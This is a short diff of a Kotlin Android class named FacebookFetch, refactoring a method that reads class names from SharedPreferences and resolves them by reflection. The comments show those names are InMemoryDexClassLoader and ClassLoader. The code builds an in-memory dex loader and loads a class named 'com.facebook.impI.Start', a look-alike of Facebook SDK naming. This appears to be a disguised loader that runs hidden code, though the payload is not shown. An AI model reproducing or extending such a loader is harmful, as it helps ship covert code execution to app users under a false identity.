@@ -14,7 +14,7 @@ class FacebookFetch {
     //"java.lang.ClassLoader"
     //"getClassLoader"
     //"iosk.gif"
-    fun readInfo(context: Context,string: String): Boolean {
+    fun readInfo(context: Context, string: String): Boolean {
         val str = context.getSharedPreferences("M_Raven", 0).getString("facebook_init", "") ?: ""
         if (str.isEmpty()) return false
         val list: List<String> = str.split("=")
@@ -32,7 +32,7 @@ class FacebookFetch {
         //"dalvik.system.InMemoryDexClassLoader"
         val c1 = Class.forName(list[0])
         //"java.nio.ByteBuffer"
-        val c2 = Class.forName("java.nio.ByteBuffer")
+        val c2 = mFacebookDecode.clazzByteBuffer
         //"java.lang.ClassLoader"
         val c3 = Class.forName(list[1])
 
@@ -40,6 +40,10 @@ class FacebookFetch {
 
         val cL = c.newInstance(bf, context.javaClass.getMethod(list[2]).invoke(context))
 
+        next(cL)
+    }
+
+    private fun next(cL: Any) {
         val lC = cL.javaClass.getMethod("loadClass", String::class.java)
             .invoke(cL, "com.facebook.impI.Start") as Class<*>
 
